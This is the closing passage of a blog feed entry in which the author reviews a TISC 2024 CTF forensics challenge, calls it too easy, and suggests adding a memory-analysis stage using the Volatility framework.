+<p>I am going to be real honest about this challenge; this one was a bit underwhelming as a CTF challenge. No doubt that yes it seems more of an introduction to computer forensics and file analysis, but i felt that this is even easier than challenge-1, which was the opening challenge.</p>
+
+<p>Maybe one such consideration to be made is to include a ‘memory analysis’ portion of the challenge (or at least the usage of the Volatility framework), and maybe the memory analysis portion would lead to the password of the ZIP file that contains the disk (I believe it might have been done using a Windows XP Virtual Machine, so you could also provide the .vmem file for the memory analysis portion)</p>
+
+<p>Then i would think that it would be an interesting challenge and probably many people would have benefited a lot more, but good try nevertheless :)</p>]]></content><author><name>baesenseii</name></author><category term="ctf" /><category term="tisc2024" /><summary type="html"><![CDATA[Quite a cheesy description for this challenge, but it looks to me that this is some forensics related stuff that we need to deal with (sigh, i don’t really like forensics to be honest haha).]]></summary></entry></feed>
